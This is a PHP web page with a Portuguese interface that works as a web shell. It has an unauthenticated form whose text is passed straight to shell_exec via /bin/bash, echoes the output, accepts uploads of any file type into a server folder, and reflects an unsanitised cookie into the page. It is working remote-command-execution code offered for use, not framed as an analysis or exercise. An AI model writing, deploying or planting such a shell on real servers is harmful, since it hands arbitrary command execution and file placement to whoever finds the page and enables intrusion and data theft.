<!DOCTYPE html>
<html>
<head>
    <title>Envio de Comandos e Upload de Arquivos</title>
    <style>
        body.light-mode {
            background-color: #f1f1f1;
            color: #000;
        }

        body.dark-mode {
            background-color: #333;
            color: #fff;
        }

        .dark-mode-button {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px;
            background-color: #f1f1f1;
            color: #000;
            border: none;
            cursor: pointer;
        }

        .upload-button {
            position: fixed;
            top: 60px;
            right: 20px;
            padding: 10px;
            background-color: #f1f1f1;
            color: #000;
            border: none;
            cursor: pointer;
        }

        .upload-form {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background-color: #f1f1f1;
            color: #000;
            border: 1px solid #ccc;
            border-radius: 5px;
            z-index: 999;
        }

        .upload-form.show {
            display: block;
        }

        .upload-form input[type="file"] {
            margin-bottom: 10px;
        }
    </style>
</head>
<body class="<?php echo isset($_COOKIE['mode']) ? $_COOKIE['mode'] : 'light-mode'; ?>">
    <h1>Envio de Comandos e Upload de Arquivos</h1>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
        <textarea name="command" rows="4" cols="50" placeholder="Digite o comando aqui"></textarea>
        <br>
        <input type="submit" value="Enviar Comando">
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $command = $_POST['command'];
        $output = shell_exec("/bin/bash -c '$command'");
        echo "<h2>Resultado:</h2>";
        echo "<pre>$output</pre>";
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadedFile'])) {
        $uploadedFile = $_FILES['uploadedFile'];
        $uploadPath = './uploads/' . basename($uploadedFile['name']);

        if (move_uploaded_file($uploadedFile['tmp_name'], $uploadPath)) {
            echo '<h2>Arquivo enviado com sucesso!</h2>';
            echo '<p>Caminho do arquivo: ' . $uploadPath . '</p>';
        } else {
            echo '<h2>Ocorreu um erro ao enviar o arquivo.</h2>';
        }
    }
    ?>

    <button class="dark-mode-button" onclick="toggleDarkMode()">Alterar para Dark Mode</button>

    <button class="upload-button" onclick="toggleUploadForm()">Upload de Arquivo</button>

    <div id="uploadForm" class="upload-form">
        <h2>Upload de Arquivos</h2>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="uploadedFile">
            <br>
            <input type="submit" value="Enviar Arquivo">
        </form>
    </div>

    <script>
        function toggleDarkMode() {
            document.body.classList.toggle("dark-mode");
            var mode = document.body.classList.contains("dark-mode") ? "dark-mode" : "light-mode";
            document.cookie = "mode=" + mode + "; path=/";
        }

        function toggleUploadForm() {
            var uploadForm = document.getElementById("uploadForm");
            uploadForm.classList.toggle("show");
        }
    </script>
</body>
</html>
